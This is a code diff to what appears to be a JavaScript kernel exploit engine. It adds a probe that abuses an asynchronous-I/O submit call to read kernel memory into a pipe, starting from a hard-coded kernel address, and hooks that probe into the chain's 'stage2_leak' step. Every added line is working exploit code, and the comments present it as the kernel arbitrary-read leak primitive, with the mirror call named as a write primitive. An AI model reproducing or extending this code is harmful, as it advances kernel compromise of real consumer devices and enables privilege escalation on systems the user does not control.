@@ -70,6 +70,7 @@ const SYS_GETPID         = 0x014;
 const SYS_SOCKET         = 0x061;
 const SYS_SOCKETPAIR     = 0x035;
 const AIO_CMD_MULTI_READ = 0x1001;
+const AIO_CMD_MULTI_WRITE = 0x1002;
 const SYS_SETSOCKOPT     = 0x069;
 const SYS_GETSOCKOPT     = 0x076;
 const SYS_EVF_CREATE     = 0x21A;
@@ -1160,6 +1161,61 @@ export function makeBagagwaEngine(X) {
         return res;
     }
 
+    // AIO arbitrary-read discovery. lapse.js's real kernel-read primitive is
+    // aio_submit_cmd(AIO_CMD_WRITE|MULTI) with reqs[+0x10] (aio_buf) pointed at
+    // a KERNEL address and reqs[+0x20] (fd) at a writable fd — the AIO copies
+    // FROM kernel memory TO the fd without copyin/copyout validation. If this
+    // works it IS the leak (and AIO_CMD_READ with a kernel aio_buf is the write
+    // primitive). Bootstrap from a known kernel .text address (the writeup's
+    // aio_multi_wait body) so no rthdr/727/evf aliasing is needed. Never throws.
+    async function probeAioArbRead() {
+        const known = i64(0x805c0210, 0xffffffff); // aio_multi_wait body (writeup)
+        const SIZE = 0x20;
+        note("[ARB] AIO arbitrary-read probe (known=0xffffffff805c0210)");
+        try {
+            const pfd = safeAlloc(8, "arb-pipe");
+            const reqs = safeAlloc(0x28, "arb-reqs");
+            const ids = safeAlloc(4, "arb-ids");
+            const rbuf = safeAlloc(SIZE, "arb-rbuf");
+            if (!pfd || !reqs || !ids || !rbuf) { note("[ARB] OOM"); return; }
+            w32(pfd.u8, 0, 0); w32(pfd.u8, 4, 0);
+            const pr = await sys(SYS_PIPE2, pfd.base, 0);
+            if (pr.failed) { note("[ARB] pipe2 failed " + pr.errText); return; }
+            const rfd = r32(pfd.u8, 0) | 0, wfd = r32(pfd.u8, 4) | 0;
+            track(rfd); track(wfd);
+
+            // candidate layouts: [aio_buf offset, aio_nbytes offset]. lapse puts
+            // aio_buf at +0x10 and fd at +0x20; nbytes is +0x08 or +0x18.
+            const layouts = [[0x10, 0x08], [0x10, 0x18]];
+            for (let li = 0; li < layouts.length; li++) {
+                const bo = layouts[li][0], no = layouts[li][1];
+                for (let z = 0; z < 0x28; z++) reqs.u8[z] = 0;
+                w64(reqs.u8, bo, known);
+                w64(reqs.u8, no, i64(SIZE, 0));
+                w32(reqs.u8, 0x20, wfd);
+                for (let z = 0; z < 4; z++) ids.u8[z] = 0;
+                let sub;
+                try { sub = await sys(SYS_AIO_SUBMIT_CMD, AIO_CMD_MULTI_WRITE, reqs.base, 1, 3, ids.base); }
+                catch (e) { note("[ARB] L" + li + " submit threw " + (e && e.message ? e.message : e)); continue; }
+                note("[ARB] L" + li + " (buf+" + bo.toString(16) + ",nbytes+" + no.toString(16) +
+                    ") submit ret=" + sub.s32 + " err=" + sub.errText);
+                await sleep(120);
+                const rd = await sys(SYS_READ, rfd, rbuf.base, SIZE);
+                let hex = "";
+                const got = rd.failed ? 0 : (rd.s32 > 0 ? rd.s32 : 0);
+                for (let i = 0; i < got && i < SIZE; i++)
+                    hex += rbuf.u8[i].toString(16).padStart(2, "0") + " ";
+                note("[ARB] L" + li + " pipe read ret=" + rd.s32 + " err=" + rd.errText +
+                    (hex ? " bytes: " + hex : " (no bytes)"));
+                if (got >= 4) break;
+            }
+            try { await sys(SYS_CLOSE, rfd); } catch (_) {}
+            try { await sys(SYS_CLOSE, wfd); } catch (_) {}
+        } catch (e) {
+            note("[ARB] threw " + (e && e.message ? e.message : e));
+        }
+    }
+
     async function stage2_leak(opts) {
         const o = opts || {};
         const out = { ok: false, why: "", steps: [], leaked: [] };
@@ -1202,6 +1258,9 @@ export function makeBagagwaEngine(X) {
         // route (IPv6 rthdr + evf aliasing) or the waker. Gate it here so the
         // log tells us which route to build before the port.
         try { await probeLapseSurface(); } catch (_) {}
+        // The AIO write-as-read primitive needs none of the burned/missing
+        // surface; it is the actual leak. Probe it too.
+        try { await probeAioArbRead(); } catch (_) {}
 
         const pr = await setupPipes();
         if (!pr.ok) { out.why = pr.why; return out; }
